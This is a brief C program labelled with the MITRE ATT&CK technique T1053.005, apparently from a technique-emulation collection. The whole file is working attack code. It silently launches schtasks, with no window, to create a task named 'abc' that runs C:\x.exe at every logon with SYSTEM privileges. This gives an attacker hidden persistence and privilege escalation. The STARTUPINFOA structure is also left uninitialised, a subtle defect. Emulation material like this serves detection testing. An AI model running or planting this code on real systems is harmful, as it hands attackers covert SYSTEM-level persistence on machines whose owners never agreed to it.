// Link      = https://attack.mitre.org/techniques/T1053/005/
// Technique = Scheduled Task/Job: Scheduled Task
// ID        = T1053.005
// Tactics   = Execution, Persistence, Privilege Escalation,

#include <windows.h>

int main() {
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)"schtasks /create /tn \"abc\" /tr C:\\x.exe /sc ONLOGON /ru \"System\"", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

